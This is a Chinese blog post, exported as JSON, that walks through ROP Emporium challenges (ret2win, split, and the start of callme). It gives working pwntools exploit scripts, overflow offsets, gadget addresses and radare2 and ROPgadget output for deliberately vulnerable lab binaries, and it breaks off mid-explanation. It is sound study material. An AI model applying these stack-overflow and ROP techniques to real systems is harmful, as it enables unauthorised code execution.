{"title":"从头复习ROP（持续更新中）","slug":"从头复习ROP","date":"2019-09-21T15:17:10.000Z","updated":"2021-02-22T15:59:39.255Z","comments":true,"path":"api/articles/从头复习ROP.json","photos":[],"link":"","excerpt":" 从头复习ROP [Figure] ","covers":["../static/images/2019-10-02-15-12-47.png","../static/images/2019-09-11-16-01-13.png","../static/images/2019-09-11-16-10-13.png","../static/images/2019-09-11-16-12-38.png","../static/images/2019-09-11-16-14-15.png","../static/images/2019-09-11-16-15-29.png","../static/images/2019-09-11-16-25-32.png","../static/images/2019-09-11-16-26-54.png","../static/images/2019-09-21-22-21-58.png","../static/images/2019-09-21-22-29-12.png","../static/images/2019-09-21-22-33-20.png","../static/images/2019-09-21-22-36-59.png","../static/images/2019-09-25-23-01-29.png","../static/images/2019-09-25-23-07-17.png"],"content":"<h1 id=\"从头复习rop\"><a class=\"markdownIt-Anchor\" href=\"#从头复习rop\"></a> 从头复习ROP</h1>\n<p><img src=\"../static/images/2019-10-02-15-12-47.png\" alt=\"\" /></p>\n<h2 id=\"一-前言\"><a class=\"markdownIt-Anchor\" href=\"#一-前言\"></a> 一、前言</h2>\n<p>  从考研结束就一直很浮躁，虽然在实习期间学习运用了一段时间web技术，但是新东西总是不想看，旧的东西又不断忘记。9月研究生开学，也算是新的开始了，沉下心来沉淀一些东西吧。感觉在学校的期间学习二进制是最合适的，所以潜下心来把二进制捡起来。</p>\n<p>  话不多说了，开始吧。<br />\n<br></p>\n<span id=\"more\"></span>\n<h2 id=\"二-参考资料\"><a class=\"markdownIt-Anchor\" href=\"#二-参考资料\"></a> 二、参考资料</h2>\n<p>  大佬们的资料都很浅显易懂，作为基础知识一定要先读一下：</p>\n<blockquote>\n<p>一步一步学ROP之linux_x86篇（原创乌云，所以只能贴个盗版地址了）<br />\n<a href=\"http://www.vuln.cn/6645\">http://www.vuln.cn/6645</a><br /><br />\n一步一步学ROP之linux_x64篇（原创乌云，所以只能贴个盗版地址了）<a href=\"http://www.vuln.cn/6644\">http://www.vuln.cn/6644</a><br /><br />\nCTF All In One（3.1.4章）:<a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.4_rop_x86.html\">https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.4_rop_x86.html</a><br />\n<br></p>\n</blockquote>\n<h2 id=\"三-软件工具\"><a class=\"markdownIt-Anchor\" href=\"#三-软件工具\"></a> 三、软件工具</h2>\n<p>以下是本文中用到的一些工具，其中的链接都包含如何安装，故在此不详细介绍安装过程。由于想尽可能训练二进制能力，所以本文将尽可能避免使用IDA进行反编译分析。</p>\n<blockquote>\n<p><a href=\"https://github.com/radare/radare2\">radare2</a>（一个功能十分强大的汇编工具）<br/><br />\n<a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a>（gdb的一个热门插件，本文并不涉及堆的知识，因此此工具使用较少，但其提供了一个比较清晰的分析界面。）<br /><br />\n<a href=\"https://github.com/Gallopsled/pwntools\">pwntools</a>（做二进制写脚本必备的python库）<br /><br />\nIDA Pro 这个各位在52上下载吧</p>\n</blockquote>\n<br>\n<h2 id=\"四-一些基础内容\"><a class=\"markdownIt-Anchor\" href=\"#四-一些基础内容\"></a> 四、一些基础内容</h2>\n<p>  基础是很重要的，想了解二进制的内容必定是要了解一些汇编语言以及底层的函数调用机制等等。所幸在本科接触二进制的时候一定程度上了解了汇编语言的一些语法、栈与函数调用的关系、二进制文件的几种保护机制等等。所以本篇主要还是用以题目实践来复习的方式复习之前学到的知识。本人才疏学浅，如果有说错的地方大佬们勿喷。<br />\n<br></p>\n<h2 id=\"五-ropemporium题目实践后续可能会更新\"><a class=\"markdownIt-Anchor\" href=\"#五-ropemporium题目实践后续可能会更新\"></a> 五、Ropemporium题目实践（后续可能会更新）</h2>\n<h3 id=\"51-ret2win\"><a class=\"markdownIt-Anchor\" href=\"#51-ret2win\"></a> 5.1 ret2win</h3>\n<h4 id=\"511-ret2win32\"><a class=\"markdownIt-Anchor\" href=\"#511-ret2win32\"></a> 5.1.1 ret2win32</h4>\n<p>  使用radare2打开文件并进行分析（这里之所以不用IDA是想熟悉一下如何使用r2）:<br />\n<img src=\"../static/images/2019-09-11-16-01-13.png\" alt=\"\" /></p>\n<p>  经过分析后，我们可以查看elf文件的保护机制、函数列表、汇编代码、字符串列表、交叉引用以及寻找gadget等等。此时我们可以查看文件调用了哪些函数以及使用了哪些字符串(afl是用来查看所调用的函数情况，而iz可以查看所调用的字符串)：<br />\n<img src=\"../static/images/2019-09-11-16-10-13.png\" alt=\"\" /></p>\n<p>  悉心的话，可以看到其中的关键字符串 /bin/cat flag.txt。我们查看其引用位置，在sym.ret2win中：<br />\n<img src=\"../static/images/2019-09-11-16-12-38.png\" alt=\"\" /></p>\n<p>  然后查看ret2win的引用情况，发现它没有被调用：<br />\n<img src=\"../static/images/2019-09-11-16-14-15.png\" alt=\"\" /></p>\n<p>  查看此处的汇编代码：<br />\n<img src=\"../static/images/2019-09-11-16-15-29.png\" alt=\"\" /></p>\n<p>  可见此处直接cat flag了，因此我们的目标就是通过栈溢出让函数跳转到此处。使用pwntools自带的函数构造污点，然后在gdb中运行程序：<br />\n<img src=\"../static/images/2019-09-11-16-25-32.png\" alt=\"\" /></p>\n<p>  可见此时EIP的值为’laaa’，我们计算一下栈溢出的偏移：<br />\n<img src=\"../static/images/2019-09-11-16-26-54.png\" alt=\"\" /></p>\n<p>  使用pwntools写脚本，构造payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p &#x3D; process(&#39;.&#x2F;ret2win32&#39;)</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*44 + p32(0x08048659)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()  </span><br></pre></td></tr></table></figure>\n<h4 id=\"512-ret2win64位\"><a class=\"markdownIt-Anchor\" href=\"#512-ret2win64位\"></a> 5.1.2 ret2win（64位）</h4>\n<p>  几乎和32位程序同理。就是偏移会少4位。</p>\n<p>  以下是payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p &#x3D; process(&quot;ret2win&quot;)</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*40 + p64(0x400811)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"52-split\"><a class=\"markdownIt-Anchor\" href=\"#52-split\"></a> 5.2 split</h3>\n<h4 id=\"521-split32\"><a class=\"markdownIt-Anchor\" href=\"#521-split32\"></a> 5.2.1 split32</h4>\n<p>  先来查看源码吧：<br />\n<img src=\"../static/images/2019-09-21-22-21-58.png\" alt=\"\" /></p>\n<p>  很明显，上述输入存在栈溢出，我们可以使用gdb来获取偏移：<br />\n<img src=\"../static/images/2019-09-21-22-29-12.png\" alt=\"\" /></p>\n<p>  把污点拿回pwntools进行计算（貌似ropemporium里偏移都是一样的，但是我觉得还是每次都应该来计算一次）：<br />\n<img src=\"../static/images/2019-09-21-22-33-20.png\" alt=\"\" /></p>\n<p>  可见此处需要的偏移是44，我们在看看它的字符串和plt表吧：<br />\n<img src=\"../static/images/2019-09-21-22-36-59.png\" alt=\"\" /></p>\n<p>  此处我们可以注意到它的plt表中存在system函数，我们可以直接调用，此外，此处它的字符串中还有cat flag.txt，我们也可以直接利用。使用pwntools脚本如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p &#x3D; process(&#39;.&#x2F;split32&#39;)</span><br><span class=\"line\">system_plt &#x3D; 0x08048430</span><br><span class=\"line\">cat_flag_str &#x3D; 0x0804a030</span><br><span class=\"line\"></span><br><span class=\"line\">#此处使用44个&#39;a&#39;来填充栈，在第45位开始返回到system函数</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*44</span><br><span class=\"line\">#system地址后的4个&#39;a&#39;是system调用完成返回后的地址</span><br><span class=\"line\">#由于我们这里并不打算做后续操作，所以任意填写了4个&#39;a&#39;进行代替</span><br><span class=\"line\">#后面的cat_flag_str是我们system所希望使用的参数</span><br><span class=\"line\">payload +&#x3D; p32(system_plt) + &#39;a&#39;*4 + p32(cat_flag_str)</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"522-split64位\"><a class=\"markdownIt-Anchor\" href=\"#522-split64位\"></a> 5.2.2 split（64位）</h4>\n<p>  思路与上面大同小异，也是偏移少了4位，但注意，64位和32位程序有个很重要的区别就是64位程序调用的前6个参数是依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数才会保存到栈上。总之，我们是需要寻找Gadget，来把我们需要的参数pop到需要的寄存器上。</p>\n<p>  如我们本题所遇到的情况，我们只需要一个参数来传递字符串&quot;cat flag.txt&quot;的地址，形如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop edi</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>  这样的汇编代码，我们跳到此位置就可以把需要调用的参数pop到edi上，然后在下一个地址存我们要返回的函数地址即system。</p>\n<p>  寻找gadget可以用安装pwntools自带的ROPgadget：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  split ROPgadget --binary split --only &quot;pop|ret&quot;             </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\">0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400880 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400882 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004006b0 : pop rbp ; ret</span><br><span class=\"line\">0x0000000000400883 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000400881 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004005b9 : ret</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>\n<p>  可见我们需要的gadget：pop rdi ; ret在地址0x400883处。</p>\n<p>  我们再查看一下64位程序中system的plt：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[0x00400650]&gt; afl</span><br><span class=\"line\">0x00400650    1 41           entry0</span><br><span class=\"line\">0x00400610    1 6            sym.imp.__libc_start_main</span><br><span class=\"line\">0x00400680    4 50   -&gt; 41   sym.deregister_tm_clones</span><br><span class=\"line\">0x004006c0    4 58   -&gt; 55   sym.register_tm_clones</span><br><span class=\"line\">0x00400700    3 28           entry.fini0</span><br><span class=\"line\">0x00400720    4 38   -&gt; 35   entry.init0</span><br><span class=\"line\">0x004007b5    1 82           sym.pwnme</span><br><span class=\"line\">0x00400600    1 6            sym.imp.memset</span><br><span class=\"line\">0x004005d0    1 6            sym.imp.puts</span><br><span class=\"line\">0x004005f0    1 6            sym.imp.printf</span><br><span class=\"line\">0x00400620    1 6            sym.imp.fgets</span><br><span class=\"line\">0x00400807    1 17           sym.usefulFunction</span><br><span class=\"line\">0x004005e0    1 6            sym.imp.system</span><br></pre></td></tr></table></figure>\n<p>  可见system的plt位置是0x4005e0。再查看一下cat flag.txt字符串的地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[0x00400650]&gt; iz</span><br><span class=\"line\">[Strings]</span><br><span class=\"line\">Num Paddr      Vaddr      Len Size Section  Type  String</span><br><span class=\"line\">000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium</span><br><span class=\"line\">001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\\n</span><br><span class=\"line\">002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \\nExiting</span><br><span class=\"line\">003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...</span><br><span class=\"line\">004 0x000008ff 0x004008ff   7   8 (.rodata) ascii &#x2F;bin&#x2F;ls</span><br><span class=\"line\">000 0x00001060 0x00601060  17  18 (.data) ascii &#x2F;bin&#x2F;cat flag.txt</span><br></pre></td></tr></table></figure>\n<p>  本题的exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p &#x3D; process(&#39;.&#x2F;split&#39;)</span><br><span class=\"line\">pop_edi_ret_gadget &#x3D; 0x00400883</span><br><span class=\"line\">cat_flag_str       &#x3D; 0x00601060</span><br><span class=\"line\">system_plt         &#x3D; 0x004005e0</span><br><span class=\"line\"></span><br><span class=\"line\">#添加偏移</span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*40</span><br><span class=\"line\">#跳转到我们之前所找到的gadget</span><br><span class=\"line\">payload +&#x3D; p64(pop_edi_ret_gadget)</span><br><span class=\"line\">#利用gadget将cat flag.txt字符串地址pop到edi寄存器上</span><br><span class=\"line\">#再通过ret跳转到system的plt表处</span><br><span class=\"line\">payload +&#x3D; p64(cat_flag_str) + p64(system_plt)</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">print p.recvline()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"53-callme\"><a class=\"markdownIt-Anchor\" href=\"#53-callme\"></a> 5.3 callme</h1>\n<h2 id=\"531-callme32\"><a class=\"markdownIt-Anchor\" href=\"#531-callme32\"></a> 5.3.1 callme32</h2>\n<p>  这道题是要读题的，反正就是要让你按照callme_one，callme_two，callme_three的顺序执行。所以我们必须依次查看pwnme函数、callme_one函数、callme_two函数，callme_three函数。并寻找可利用的溢出点。首先我们可以看到pwnme函数中存在一个十分明显的溢出点：</p>\n<p><img src=\"../static/images/2019-09-25-23-01-29.png\" alt=\"\" /></p>\n<p>  经过测试，它需要填充的字符数量仍然是44个字符。由此我们可以构造出第一个payload。紧接着我们分析callme_one函数（此时需要分析liccallme.so里的程序）：</p>\n<p><img src=\"../static/images/2019-09-25-23-07-17.png\" alt=\"\" /></p>\n<p>  在callme_one函数中，存在一组判断，如果a1,a2,a3参数不是分别依次等于1,2,3的话会立即退出。而这个函数并没有其他交互的输入操作，因此我们可以在之前的pwnme函数中输入足够长的内容用来构造callme_one，callme_two，callme_three的值。由于我们进入callme_one是通过ret（相当于pop eip）来实现的，而非call（相当于push eip；mov eip callme_one_addr）。因此我们的栈空间不受影响，可以覆盖掉其返回的eip指针，将其覆盖为callme_two的地址，因此我们可以构造出第二个payload。</p>\n<p>  接下来分析callme_two函数：</p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":4,"path":"api/tags/pwn.json"}]}